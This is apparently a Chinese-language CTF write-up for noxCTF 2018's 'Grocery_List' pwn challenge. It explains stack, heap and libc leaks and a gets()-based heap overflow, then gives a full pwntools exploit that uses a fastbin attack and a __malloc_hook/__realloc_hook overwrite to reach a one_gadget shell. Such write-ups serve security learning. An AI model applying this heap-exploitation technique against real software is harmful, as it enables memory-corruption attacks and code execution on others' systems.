---
title: Grocery_List_Noxctf
date: 2018-09-11 12:59:39
tags: pwn heap
layout: post
---
Grocery_List

atk by hooks 
<!--more-->
## 0x00 Analysis

[Timu][1]

首先checksec发现标配全保护


## 0x01 LeakAddress
菜单中1选项的print可以泄露
```arm
do_puts("\n----------");
  for ( i = 0; i < sum; ++i )
  {
    printf("%d. %s\n", (unsigned int)i, array[i]);
    fflush(stdout);
  }
```
但是遗憾地,在对chunk内容做操作的时候都会在用\0截断防止我们的leak
### stack
在Add default examplez中泄露了一个栈地址
### heap
在删除chunk后没将内容置为0所以可以删除后再malloc回来获得fd指针从而获得heap地址

## 0x02漏洞分析
主要漏洞存在于：
Edit an existing item

这里的输入函数是gets造成了堆溢出
可以做fast_bin_atk

## 0x03漏洞利用
```python
add_empty(3)
remove(1)
payload="A"*0x18+p64(0x21)+p64(0x7fffffffdd00)+"\0"*0x10+p64(0x20)
edit(0,payload)
add_empty(2)
```
先创建chunk
free掉第二个chunk
第一个溢出覆盖fd
然后malloc两次获得fd+10区域的位置的写
但是需要注意对fakechunk的size的检查

在main函数中有;
```arm
v6 = 0x21LL;
```
所以可以在栈上构造small的chunk
来leak libc的基地址

泄露libc之后虽然本题没有给出libc但是luckily和另外的题目libc一样还和我的ubuntu也一样...
所以可以跳one_gadget


因为本题还开了canary和full relro
* canary：因为那个将\n换成\0我目前是没啥办法泄露canary
* full relro: got表不可写

libc已经泄露所以我们选择使用hooks
首先使用mallochook
但是发现4个one_gadget都没有符合条件
后来在大佬们的wp中学到了套路:
* 把mallochook指向realloc+0x10
    #不懂为啥....
* 改写realloc_hook为one_gadget

## 0x04 EXP
```python
from pwn import *
#context.log_level="debug"
def cmd(cmd):
	p.readuntil("Exit\n")
	p.sendline(str(cmd))
def example():
	cmd(6)
def show():
	cmd(1)
	sleep(0.1)
def remove(index):
	cmd(4)
	p.readuntil("emove?\n")
	p.sendline(str(index))
def edit(index,c):
	cmd(5)
	p.readuntil("edit?\n")
	p.sendline(str(index))
	p.readuntil("name: \n")
	p.sendline(c)
def add_empty(num,size=1):
	cmd(3)
	p.readuntil("Large\n")
	p.sendline(str(size))
	p.readuntil("to add?\n")
	p.sendline(str(num))
def fast_bin_atk():
	add_empty(3)
	remove(1)
	payload="A"*0x18+p64(0x21)+p64(0x7fffffffdd00)+"\0"*0x10+p64(0x20)
	edit(0,payload)
	add_empty(2)
p=process("./list")
#p=remote("chal.noxale.com",1232)
libc=ELF("./libc.so.6")
example()
show()
p.readuntil("0. ")
data=p.readline()
stack=u64(data[:-1].ljust(8,'\0'))-(0x7fffffffdd3b-0x00007ffffffde000)+0x20
gdb.attach(p)
log.info(hex(stack))
remove(0)
#stack leak over #
add_empty(2)
remove(1)
remove(0)
add_empty(1)
show()
p.readuntil("0. ")
data=p.readline()
heap=u64(data[:-1].ljust(8,'\0'))-(0x0000555555758440-0x0000555555757000)
log.info(hex(heap))
remove(0)
#heap leak over #
#do uaf to leak libc & pie#
#aim 0x7fffffffdd20-0x00007ffffffde000
fast_bin_atk()
show()
p.readuntil("3. ")
data=p.readline()
log.success("baseaddress:---------->%s",hex(u64(data[:-1].ljust(8,'\0'))))
base=u64(data[:-1].ljust(8,'\0'))-(0x00007ffff7a2d830-0x00007ffff7a0d000)
one_gadget=0x4526a+base
libc.address=base
#libc leak over#
mhook=libc.symbols['__malloc_hook']
rehook=libc.symbols['__realloc_hook']
log.success("mhook:---------->%s",hex(mhook))
log.success("rehook:---------->%s",hex(rehook))
add_empty(3,3)
remove(5)
payload="A"*0x68+p64(0x71)+p64(mhook-0x23)
edit(4,payload)
add_empty(2,3)
log.info(hex(libc.symbols['__libc_realloc']))
payload="A"*(0x13-0x8)+p64(one_gadget)+p64(libc.symbols['__libc_realloc']+0x10)
edit(7,payload)
add_empty(1,1)
p.interactive()
```
## 0x05 Review
hook平时还是用的太少了 差点点点点就做出来了

[1]:https://github.com/n132/banana/tree/master/Pwn/noxctf/list